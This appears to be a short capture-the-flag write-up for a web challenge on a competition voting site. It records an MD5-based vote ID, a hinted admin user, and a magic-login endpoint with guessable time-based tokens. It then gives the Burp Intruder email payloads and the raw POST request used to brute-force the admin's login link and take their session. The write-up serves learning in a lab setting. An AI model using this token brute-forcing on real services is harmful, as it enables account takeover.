registered. mail didnt come. retry retry retry

mail did come

voted. observed that `your-vote` has md5

also got hint
```
<!-- show the secret win code to admin user (id:1) -->
```

https://voting.challs.cybersecuritychallenge.ro/index.php/dashboard/your-vote/c4ca4238a0b923820dcc509a6f75849b

got email of admin `sqe027adVn@bkmvenjrbhvuerb23.com`

what now?

looked around. observed in burp some `i-am-old` link. tried. magic login link.

```
5ca8763db
5ca875f75
5ca875d3d
5ca876d98
5ca8763ea
5ca876db4
5ca876d78
5ca877288
5ca877aba
5ca8784a5
5ca87d426
5ca87d744
5ca87d759
5ca87d76d
5ca87d7c1
5ca87d775
5ca87d781
5ca87d795
5ca87d7a1
5ca87d7b9
5ca87d7c9
5ca87d02a
5ca87d03b
```

seems bruteforceable.

run burp intruder with
```
nytr0gen.george@gmail.com
sqe027adVn@bkmvenjrbhvuerb23.com
nytr0gen.george@gmail.com
sqe027adVn@bkmvenjrbhvuerb23.com
nytr0gen.george@gmail.com
sqe027adVn@bkmvenjrbhvuerb23.com
nytr0gen.george@gmail.com
sqe027adVn@bkmvenjrbhvuerb23.com
nytr0gen.george@gmail.com
sqe027adVn@bkmvenjrbhvuerb23.com
nytr0gen.george@gmail.com
sqe027adVn@bkmvenjrbhvuerb23.com
nytr0gen.george@gmail.com
sqe027adVn@bkmvenjrbhvuerb23.com
nytr0gen.george@gmail.com
sqe027adVn@bkmvenjrbhvuerb23.com
nytr0gen.george@gmail.com
sqe027adVn@bkmvenjrbhvuerb23.com
nytr0gen.george@gmail.com
sqe027adVn@bkmvenjrbhvuerb23.com
nytr0gen.george@gmail.com
sqe027adVn@bkmvenjrbhvuerb23.com
nytr0gen.george@gmail.com
sqe027adVn@bkmvenjrbhvuerb23.com
```

against
```
POST /index.php/old-request HTTP/1.1
Host: voting.challs.cybersecuritychallenge.ro
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://voting.challs.cybersecuritychallenge.ro/index.php/i-am-old
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
DNT: 1
Connection: close

_token=xqECJlt3eF6feIQMbvOVaglQHs8FZJxjo3Izlcfo&email=§nytr0gen.george%40gmail.com§
```

got two close ids. bruteforce between them. got cookie for admin. see picture
